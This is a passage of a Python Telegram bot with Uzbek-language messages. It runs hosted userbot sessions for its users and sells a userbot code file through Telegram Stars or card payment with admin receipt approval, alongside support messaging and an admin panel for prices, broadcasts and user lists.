        f"📱 Tel: <code>+{me.phone}</code>\n\n"
        f"💡 Userbot ichida <code>.help</code> deb ko'ring",
        parse_mode=ParseMode.HTML, reply_markup=markup)
    await _show_user_main(update, uid)

# ═══════════════════════════════════════════════════════════════
#  ⑪ USERBOT YOQ/TO'XTAT
# ═══════════════════════════════════════════════════════════════
async def _ub_stop_user(update, uid):
    await ub_stop(uid)
    sess = DB["sessions"].get(str(uid), {})
    sess["active"] = False
    DB["sessions"][str(uid)] = sess
    db_save()
    await update.message.reply_text("⏸ <b>Userbot to'xtatildi.</b>", parse_mode=ParseMode.HTML)
    await _show_user_main(update, uid)

async def _ub_start_user(update, uid):
    sess = DB["sessions"].get(str(uid), {})
    if not sess.get("session"):
        kb = ReplyKeyboardMarkup([[KeyboardButton("📱 Raqamni yuborish", request_contact=True)]],
                                  resize_keyboard=True, one_time_keyboard=True)
        return await update.message.reply_text("📱 Qaytadan ulash uchun raqamni yuboring:", reply_markup=kb)
    await update.message.reply_text("⏳ Ulanyapti...")
    ok, err = await ub_start(uid, sess["session"])
    if ok:
        sess["active"] = True
        DB["sessions"][str(uid)] = sess
        db_save()
        await update.message.reply_text("▶️ <b>Userbot yoqildi!</b>", parse_mode=ParseMode.HTML)
    else:
        DB["sessions"].pop(str(uid), None)
        db_save()
        kb = ReplyKeyboardMarkup([[KeyboardButton("📱 Raqamni yuborish", request_contact=True)]],
                                  resize_keyboard=True, one_time_keyboard=True)
        await update.message.reply_text("❌ Session eskirgan. Qaytadan ulaning.", reply_markup=kb)
    await _show_user_main(update, uid)

# ═══════════════════════════════════════════════════════════════
#  ⑫ KOD SOTIB OLISH
# ═══════════════════════════════════════════════════════════════
async def _show_buy(msg_or_query, uid, edit=False):
    p = prod()
    if not p["name"] or not p["code_text"]:
        txt = "❌ Hozircha kod yuklanmagan."
        if edit: await msg_or_query.edit_message_text(txt)
        else:    await msg_or_query.reply_text(txt)
        return
    buttons = []
    if p["stars_on"] and p["stars_price"] > 0:
        buttons.append([InlineKeyboardButton(f"⭐ Stars ({p['stars_price']} ⭐)", callback_data="pay_stars")])
    if p["card_on"] and p["card_price"] > 0:
        buttons.append([InlineKeyboardButton(f"💳 Karta ({p['card_price']:,} so'm)", callback_data="pay_card")])
    if not buttons:
        txt = "❌ To'lov tizimlari topilmadi."
        if edit: await msg_or_query.edit_message_text(txt)
        else:    await msg_or_query.reply_text(txt)
        return
    txt    = f"🛒 <b>{p['name']}</b>\n\nTo'lov usulini tanlang:"
    markup = InlineKeyboardMarkup(buttons)
    if edit: await msg_or_query.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=markup)
    else:    await msg_or_query.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=markup)

async def cb_pay_stars(update, ctx):
    query = update.callback_query
    await query.answer()
    p = prod()
    await ctx.bot.send_invoice(
        chat_id=query.from_user.id, title=p["name"],
        description="Userbot kodi — to'lovdan so'ng avtomatik yuboriladi",
        payload=f"code_{query.from_user.id}", currency="XTR",
        prices=[LabeledPrice(label=p["name"], amount=p["stars_price"])], provider_token=""
    )

async def handle_precheckout(update, ctx):
    await update.pre_checkout_query.answer(ok=True)

async def handle_successful_payment(update, ctx):
    uid = update.effective_user.id
    p   = prod()
    u   = users().get(str(uid), {})
    await _deliver_code(ctx, uid, p)
    DB["users"][str(uid)]["bought"] = True
    db_save()
    await ctx.bot.send_message(ADMIN_ID,
        f"💰 <b>Yangi Stars sotib olish!</b>\n\n"
        f"👤 {u.get('name','?')}\n📱 +{u.get('phone','?')}\n🆔 {uid}\n"
        f"⭐ {p['stars_price']} stars\n📦 {p['name']}", parse_mode=ParseMode.HTML)

async def _deliver_code(ctx, uid, p):
    fname = (p["name"] or "userbot").replace(" ", "_") + ".py"
    buf   = io.BytesIO(p["code_text"].encode("utf-8"))
    buf.name = fname
    await ctx.bot.send_document(uid, document=buf,
        caption=f"✅ <b>To'lov qabul qilindi!</b>\n\n🎁 <b>{p['name']}</b> fayli tayyor!",
        parse_mode=ParseMode.HTML)

async def cb_pay_card(update, ctx):
    query = update.callback_query
    await query.answer()
    uid   = query.from_user.id
    p     = prod()
    STATES[uid] = {"step": "wait_receipt"}
    markup = InlineKeyboardMarkup([[InlineKeyboardButton("📸 Chek rasmini yubordim", callback_data="hint_receipt")]])
    await query.edit_message_text(
        f"💳 <b>Karta ma'lumotlari:</b>\n\n"
        f"🏦 Nomi: <b>{p['card_name']}</b>\n"
        f"💳 Raqam: <code>{p['card_number']}</code>\n"
        f"👤 Egasi: <b>{p['card_holder']}</b>\n"
        f"💰 Narx: <b>{p['card_price']:,} so'm</b>\n\n"
        f"📸 Kartaga to'lov qilib, <b>chek rasmini yuboring</b>.",
        parse_mode=ParseMode.HTML, reply_markup=markup)

async def handle_receipt_photo(update, ctx):
    uid = update.effective_user.id
    if is_admin(uid) or STATES.get(uid, {}).get("step") != "wait_receipt":
        return
    u  = users().get(str(uid), {})
    p  = prod()
    markup = InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"approve_{uid}"),
        InlineKeyboardButton("❌ Bekor qilish", callback_data=f"reject_{uid}")
    ]])
    caption = (f"📸 <b>Yangi to'lov cheki!</b>\n\n"
               f"👤 {u.get('name','?')}\n📱 +{u.get('phone','?')}\n🆔 {uid}\n"
               f"📦 {p['name']}\n💰 {p['card_price']:,} so'm")
    photo = update.message.photo[-1] if update.message.photo else None
    if photo:
        await ctx.bot.send_photo(ADMIN_ID, photo.file_id, caption=caption,
                                  parse_mode=ParseMode.HTML, reply_markup=markup)
    else:
        await ctx.bot.send_message(ADMIN_ID, caption, parse_mode=ParseMode.HTML, reply_markup=markup)
    STATES.pop(uid, None)
    await update.message.reply_text("✅ Chek adminga yuborildi. Tasdiqlashini kuting.")

async def _receipt_text_to_admin(update, ctx, uid, text):
    u  = users().get(str(uid), {})
    p  = prod()
    markup = InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"approve_{uid}"),
        InlineKeyboardButton("❌ Bekor qilish", callback_data=f"reject_{uid}")
    ]])
    await ctx.bot.send_message(ADMIN_ID,
        f"📩 <b>Yangi to'lov (matn)</b>\n\n"
        f"👤 {u.get('name','?')}\n📱 +{u.get('phone','?')}\n🆔 {uid}\n"
        f"💬 {text}\n💰 {p['card_price']:,} so'm",
        parse_mode=ParseMode.HTML, reply_markup=markup)
    STATES.pop(uid, None)
    await update.message.reply_text("✅ To'lov ma'lumotingiz adminga yuborildi.")

async def cb_approve(update, ctx):
    query = update.callback_query
    await query.answer()
    if not is_admin(query.from_user.id): return
    target = int(query.data.split("_")[1])
    try:
        await _deliver_code(ctx, target, prod())
        DB["users"][str(target)]["bought"] = True
        db_save()
        await query.edit_message_reply_markup(reply_markup=None)
        await query.message.reply_text(f"✅ #{target} ga kod fayli yuborildi.")
    except Exception as e:
        await query.message.reply_text(f"❌ {e}")

async def cb_reject(update, ctx):
    query = update.callback_query
    await query.answer()
    if not is_admin(query.from_user.id): return
    target = int(query.data.split("_")[1])
    try:
        await ctx.bot.send_message(target, "❌ <b>To'lovingiz bekor qilindi.</b>", parse_mode=ParseMode.HTML)
        await query.edit_message_reply_markup(reply_markup=None)
        await query.message.reply_text(f"❌ #{target} ga rad xabari yuborildi.")
    except Exception as e:
        await query.message.reply_text(f"❌ {e}")

# ═══════════════════════════════════════════════════════════════
#  ⑬ MUROJAT — IKKI TOMONLAMA
# ═══════════════════════════════════════════════════════════════
async def _ask_support(update):
    uid = update.effective_user.id
    STATES[uid] = {"step": "wait_support"}
    await update.message.reply_text("💬 <b>Murojat matningizni yozing:</b>",
                                     parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove())

async def _send_support_msg(update, ctx, uid, text):
    u = users().get(str(uid), {})
    markup = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Javob berish", callback_data=f"reply_user_{uid}")]])
    await ctx.bot.send_message(ADMIN_ID,
        f"📩 <b>Yangi murojat</b>\n\n"
        f"👤 {u.get('name','?')}\n📱 +{u.get('phone','?')}\n🆔 {uid}\n\n💬 {text}",
        parse_mode=ParseMode.HTML, reply_markup=markup)
    STATES.pop(uid, None)
    await update.message.reply_text("✅ <b>Murojatingiz adminga yuborildi.</b>",
                                     parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove())
    await _show_user_main(update, uid)

async def _send_user_reply_to_admin(update, ctx, uid, text):
    u = users().get(str(uid), {})
    markup = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Javob berish", callback_data=f"reply_user_{uid}")]])
    await ctx.bot.send_message(ADMIN_ID,
        f"↩️ <b>Foydalanuvchi javobi</b>\n\n👤 {u.get('name','?')}\n🆔 {uid}\n\n💬 {text}",
        parse_mode=ParseMode.HTML, reply_markup=markup)
    STATES.pop(uid, None)
    await update.message.reply_text("✅ Javobingiz adminga yuborildi.", reply_markup=ReplyKeyboardRemove())
    await _show_user_main(update, uid)

# ═══════════════════════════════════════════════════════════════
#  ⑭ ADMIN PANEL
# ═══════════════════════════════════════════════════════════════
async def _show_admin_menu(update):
    p  = prod()
    kb = ReplyKeyboardMarkup([
        ["📦 Kod yuklash",      "💳 To'lov tizimlari"],
        ["📢 Xabar yuborish",   "💲 Narxni tahrirlash"],
        ["👥 Foydalanuvchilar", "🔄 Restart"]
    ], resize_keyboard=True)
    s  = "✅" if p["stars_on"] else "❌"
    c  = "✅" if p["card_on"]  else "❌"
    msg = update.message or (update.callback_query.message if update.callback_query else None)
    if msg:
        await msg.reply_text(
            f"👑 <b>Admin Panel</b>\n\n"
            f"📦 Kod: <b>{p['name'] or 'Yuklanmagan'}</b>\n"
            f"⭐ Stars: {s} {p['stars_price']} | 💳 Karta: {c} {p['card_price']:,}",
            parse_mode=ParseMode.HTML, reply_markup=kb)

async def _admin_text(update, ctx, text):
    uid  = ADMIN_ID
    st   = STATES.get(uid, {})
    step = st.get("step", "")

    if step == "up_name":
        st["name"] = text; st["step"] = "up_pay"; STATES[uid] = st
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("⭐ Faqat Stars",     callback_data="up_pay_stars")],
            [InlineKeyboardButton("💳 Faqat Karta",     callback_data="up_pay_card")],
            [InlineKeyboardButton("⭐ + 💳 Ikkisi ham", callback_data="up_pay_both")]
        ])
        await update.message.reply_text(f"📦 Nomi: <b>{text}</b>\n\nTo'lov tizimini tanlang:",
                                         parse_mode=ParseMode.HTML, reply_markup=markup)
        return

    if step == "up_stars_price":
        try:
            price = int(text); st["stars_price"] = price
            nxt   = st.pop("next_after_stars", "wait_py_file"); st["step"] = nxt; STATES[uid] = st
            if nxt == "up_card_name": await update.message.reply_text("💳 Karta nomini kiriting:")
            else:                     await update.message.reply_text("📂 Python faylini (.py) yuboring:")
        except ValueError:
            await update.message.reply_text("❌ Raqam kiriting!")
        return

    if step == "up_card_name":
        st["card_name"] = text; st["step"] = "up_card_number"; STATES[uid] = st
        await update.message.reply_text("💳 Karta raqamini kiriting:")
        return
    if step == "up_card_number":
        st["card_number"] = text; st["step"] = "up_card_holder"; STATES[uid] = st
        await update.message.reply_text("👤 Karta egasini kiriting:")
        return
    if step == "up_card_holder":
        st["card_holder"] = text; st["step"] = "up_card_price"; STATES[uid] = st
        await update.message.reply_text("💰 Narxni kiriting (so'm):")
        return
    if step == "up_card_price":
        try:
            price = int(text); st["card_price"] = price; st["step"] = "up_card_confirm"; STATES[uid] = st
            markup = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Tasdiqlash", callback_data="up_card_confirm")]])
            await update.message.reply_text(
                f"💳 <b>Karta:</b>\nNomi: {st.get('card_name')}\n"
                f"Raqam: <code>{st.get('card_number')}</code>\n"
                f"Egasi: {st.get('card_holder')}\nNarx: {price:,} so'm",
                parse_mode=ParseMode.HTML, reply_markup=markup)
        except ValueError:
            await update.message.reply_text("❌ Raqam kiriting!")
        return

    if step == "edit_stars_price":
        try:
            prod()["stars_price"] = int(text); db_save(); STATES.pop(uid, None)
            await update.message.reply_text(f"✅ Stars narxi {int(text)} ga o'zgartirildi.")
            await _show_admin_menu(update)
        except ValueError:
            await update.message.reply_text("❌ Raqam kiriting!")
        return

    if step == "edit_card_price":
        try:
            prod()["card_price"] = int(text); db_save(); STATES.pop(uid, None)
            await update.message.reply_text(f"✅ Karta narxi {int(text):,} so'mga o'zgartirildi.")
            await _show_admin_menu(update)
        except ValueError:
            await update.message.reply_text("❌ Raqam kiriting!")
        return

    if step == "toggle_stars_price":
        try:
            prod()["stars_price"] = int(text); prod()["stars_on"] = True
            db_save(); STATES.pop(uid, None)
            await update.message.reply_text(f"✅ Stars yoqildi. Narx: {int(text)} stars.")
            await _show_admin_menu(update)
        except ValueError:
            await update.message.reply_text("❌ Raqam kiriting!")
        return

    if step == "toggle_card_name":
        STATES[uid] = {"step": "toggle_card_number", "card_name": text}
        await update.message.reply_text("💳 Karta raqamini kiriting:")
        return
    if step == "toggle_card_number":
        STATES[uid] = {**STATES.get(uid,{}), "step": "toggle_card_holder", "card_number": text}
        await update.message.reply_text("👤 Karta egasini kiriting:")
        return
    if step == "toggle_card_holder":
        STATES[uid] = {**STATES.get(uid,{}), "step": "toggle_card_price", "card_holder": text}
        await update.message.reply_text("💰 Narxini kiriting (so'm):")
        return
    if step == "toggle_card_price":
        try:
            price = int(text); st2 = STATES.get(uid, {}); p = prod()
            p["card_name"] = st2.get("card_name",""); p["card_number"] = st2.get("card_number","")
            p["card_holder"] = st2.get("card_holder",""); p["card_price"] = price; p["card_on"] = True
            db_save(); STATES.pop(uid, None)
            await update.message.reply_text(f"✅ Karta yoqildi. Narx: {price:,} so'm.")
            await _show_admin_menu(update)
        except ValueError:
            await update.message.reply_text("❌ Raqam kiriting!")
        return

    if step == "broadcast":
        sent = 0
        for t_str in users():
            try:
                await ctx.bot.send_message(int(t_str), f"📢 <b>Admin xabari:</b>\n\n{text}", parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.05)
            except Exception:
                pass
        STATES.pop(uid, None)
        await update.message.reply_text(f"✅ {sent} ta foydalanuvchiga yuborildi.")
        await _show_admin_menu(update)
        return

    if step == "admin_reply_to":
        target = st.get("target")
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Javob berish", callback_data="user_reply_admin")]])
        try:
            await ctx.bot.send_message(target, f"📨 <b>Admin xabari:</b>\n\n{text}",
                                        parse_mode=ParseMode.HTML, reply_markup=markup)
            await update.message.reply_text("✅ Javob yuborildi.")
        except Exception as e:
            await update.message.reply_text(f"❌ {e}")
        STATES.pop(uid, None)
        await _show_admin_menu(update)
        return

    await _admin_btn(update, ctx, text)

async def _admin_btn(update, ctx, text):
    uid = ADMIN_ID
    if "Kod yuklash" in text:
        STATES[uid] = {"step": "up_name"}
        await update.message.reply_text("📦 Kod nomi nima?", reply_markup=ReplyKeyboardRemove())
    elif "To'lov tizimlari" in text:
        p = prod()
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"⭐ Stars — {'✅' if p['stars_on'] else '❌'} ({p['stars_price']} ⭐)", callback_data="toggle_stars")],
            [InlineKeyboardButton(f"💳 Karta — {'✅' if p['card_on'] else '❌'} ({p['card_price']:,} so'm)", callback_data="toggle_card")]
        ])
        await update.message.reply_text("💳 <b>To'lov tizimlari</b>", parse_mode=ParseMode.HTML, reply_markup=markup)
    elif "Xabar yuborish" in text:
        STATES[uid] = {"step": "broadcast"}
        await update.message.reply_text(f"📢 Barcha {len(users())} foydalanuvchiga xabar yozing:", reply_markup=ReplyKeyboardRemove())
    elif "Narxni tahrirlash" in text:
        p = prod(); buttons = []
        if p["stars_on"]: buttons.append([InlineKeyboardButton(f"⭐ Stars ({p['stars_price']})", callback_data="ep_stars")])
        if p["card_on"]:  buttons.append([InlineKeyboardButton(f"💳 Karta ({p['card_price']:,} so'm)", callback_data="ep_card")])
        if not buttons:
            await update.message.reply_text("❌ Faol to'lov tizimlari yo'q.")
        else:
            await update.message.reply_text("💲 Qaysi narxni o'zgartirmoqchisiz?", reply_markup=InlineKeyboardMarkup(buttons))
    elif "Foydalanuvchilar" in text:
        u_list = users()
        if not u_list:
            return await update.message.reply_text("👥 Foydalanuvchilar yo'q.")
        t = f"👥 <b>Foydalanuvchilar ({len(u_list)} ta):</b>\n\n"
        for uid_str, u in list(u_list.items())[-25:]:
            sess = DB["sessions"].get(uid_str, {})
            icon = "🟢" if sess.get("active") and int(uid_str) in UB else "🔴"
            t += f"{icon} <b>{u.get('name','?')}</b> | +{u.get('phone','?')} | <code>{uid_str}</code>\n"
        await update.message.reply_text(t, parse_mode=ParseMode.HTML)
    elif "Restart" in text:
        await update.message.reply_text("♻️ Qayta ishga tushirilmoqda...")
        db_save()
        os.execv(sys.executable, [sys.executable] + sys.argv)
    else:
        await _show_admin_menu(update)

# ═══════════════════════════════════════════════════════════════
#  ⑮ .py FAYL QABUL QILISH
# ═══════════════════════════════════════════════════════════════
async def handle_document(update, ctx):
    uid  = update.effective_user.id
    if not is_admin(uid): return
    st   = STATES.get(uid, {})
    step = st.get("step", "")
    if step not in ("wait_py_file", "up_code"):
        await _show_admin_menu(update)
        return
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".py"):
        return await update.message.reply_text("❌ Faqat <b>.py</b> fayl!", parse_mode=ParseMode.HTML)
    await update.message.reply_text("⏳ Fayl yuklanmoqda...")
    file = await ctx.bot.get_file(doc.file_id)
    buf  = io.BytesIO()
    await file.download_to_memory(buf)
    code_text = buf.getvalue().decode("utf-8", errors="replace")
    p = prod()
    p["name"]      = st.get("name", p["name"])
    p["code_text"] = code_text
    if st.get("pay_stars"): p["stars_on"] = True; p["stars_price"] = st.get("stars_price", 0)
    if st.get("pay_card"):  p["card_on"]  = True; p["card_price"]  = st.get("card_price",  0)
    if st.get("card_name"):   p["card_name"]   = st["card_name"]
    if st.get("card_number"): p["card_number"] = st["card_number"]
    if st.get("card_holder"): p["card_holder"] = st["card_holder"]
    db_save(); STATES.pop(uid, None)
    await update.message.reply_text(
        f"✅ <b>Kod fayli muvaffaqiyatli yuklandi!</b>\n\n"
        f"📦 Nomi: <b>{p['name']}</b>\n"
        f"📄 Fayl: <code>{doc.file_name}</code>\n"
        f"📏 Hajm: {len(code_text):,} belgi\n"
        f"⭐ Stars: {'✅' if p['stars_on'] else '❌'} {p['stars_price']}\n"
        f"💳 Karta: {'✅' if p['card_on'] else '❌'} {p['card_price']:,} so'm",
        parse_mode=ParseMode.HTML)
    await _show_admin_menu(update)

# ═══════════════════════════════════════════════════════════════
#  ⑯ CALLBACK HANDLER
# ═══════════════════════════════════════════════════════════════
async def callback_handler(update, ctx):
    query = update.callback_query
    data  = query.data
    uid   = query.from_user.id

    if data == "buy_code":
        await query.answer(); await _show_buy(query, uid, edit=True)
    elif data == "pay_stars":
        await cb_pay_stars(update, ctx)
    elif data == "pay_card":
        await cb_pay_card(update, ctx)
    elif data == "support":
        await query.answer(); STATES[uid] = {"step": "wait_support"}
        await query.message.reply_text("💬 <b>Murojat matningizni yozing:</b>",
                                        parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove())
    elif data == "hint_receipt":
        await query.answer("📸 Chek rasmini yoki matnini yuboring.", show_alert=True)
    elif data == "user_reply_admin":
        await query.answer()
        if is_admin(uid): return
        STATES[uid] = {"step": "user_reply_admin"}
        await query.message.reply_text("✍️ Adminga javobingizni yozing:", reply_markup=ReplyKeyboardRemove())
    elif data.startswith("approve_"):
        await cb_approve(update, ctx)
    elif data.startswith("reject_"):
        await cb_reject(update, ctx)
    elif data.startswith("reply_user_"):
        await query.answer()
        if not is_admin(uid): return
        target = int(data.split("_")[-1])
        STATES[ADMIN_ID] = {"step": "admin_reply_to", "target": target}
        await query.message.reply_text(f"✍️ #{target} foydalanuvchiga javobingizni yozing:")
    elif data == "toggle_stars":
        await query.answer()
        if not is_admin(uid): return
        p = prod()
        if p["stars_on"]: p["stars_on"] = False; p["stars_price"] = 0; db_save(); await query.edit_message_text("❌ Stars o'chirildi.")
        else: STATES[ADMIN_ID] = {"step": "toggle_stars_price"}; await query.edit_message_text("⭐ Stars narxini kiriting:")
    elif data == "toggle_card":
        await query.answer()
        if not is_admin(uid): return
        p = prod()
        if p["card_on"]: p["card_on"] = False; p["card_price"] = 0; db_save(); await query.edit_message_text("❌ Karta o'chirildi.")
        else: STATES[ADMIN_ID] = {"step": "toggle_card_name"}; await query.edit_message_text("💳 Karta nomini kiriting:")
    elif data == "ep_stars":
        await query.answer(); STATES[ADMIN_ID] = {"step": "edit_stars_price"}
        await query.edit_message_text("⭐ Yangi Stars narxini kiriting:")
    elif data == "ep_card":
        await query.answer(); STATES[ADMIN_ID] = {"step": "edit_card_price"}
        await query.edit_message_text("💳 Yangi karta narxini kiriting (so'm):")
    elif data == "up_pay_stars":
        await query.answer()
        st = STATES.get(ADMIN_ID, {})
        st.update({"step": "up_stars_price", "pay_stars": True, "pay_card": False, "next_after_stars": "wait_py_file"})
        STATES[ADMIN_ID] = st; await query.edit_message_text("⭐ Stars narxini kiriting:")
    elif data == "up_pay_card":
        await query.answer()
        st = STATES.get(ADMIN_ID, {})
        st.update({"step": "up_card_name", "pay_stars": False, "pay_card": True})
        STATES[ADMIN_ID] = st; await query.edit_message_text("💳 Karta nomini kiriting:")
    elif data == "up_pay_both":
        await query.answer()
        st = STATES.get(ADMIN_ID, {})
        st.update({"step": "up_stars_price", "pay_stars": True, "pay_card": True, "next_after_stars": "up_card_name"})
        STATES[ADMIN_ID] = st; await query.edit_message_text("⭐ Avval Stars narxini kiriting:")
    elif data == "up_card_confirm":
        await query.answer()
        st = STATES.get(ADMIN_ID, {}); st["step"] = "wait_py_file"; STATES[ADMIN_ID] = st
        await query.edit_message_text("✅ Karta saqlandi!\n\n📂 Endi Python faylini (.py) yuboring:")
    else:
        await query.answer("⚠️ Noma'lum amal")

# ═══════════════════════════════════════════════════════════════
#  ⑰ SESSION TIKLASH + MAIN
# ═══════════════════════════════════════════════════════════════
async def restore_all_sessions():
    for uid_str, sess in list(DB["sessions"].items()):
        if sess.get("active") and sess.get("session"):
            uid = int(uid_str)
            ok, err = await ub_start(uid, sess["session"])
            if ok:
                logging.warning(f"✅ Session restored: {uid}")
            else:
                sess["active"] = False
                logging.warning(f"❌ Session failed {uid}: {err}")
    db_save()

async def main():
    await restore_all_sessions()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.PHOTO & ~filters.COMMAND, handle_receipt_photo))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(PreCheckoutQueryHandler(handle_precheckout))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, handle_successful_payment))

    print("=" * 55)
    print("🚀 NICO Userbot Bot ishga tushdi!")
    print(f"👑 Admin ID : {ADMIN_ID}")
    print(f"🐍 Python   : {sys.version.split()[0]}")
    print("=" * 55)

    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    try:
        await asyncio.Event().wait()
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()
        for cl in UB.values():
            try: await cl.disconnect()
            except: pass

if __name__ == "__main__":
    asyncio.run(main())
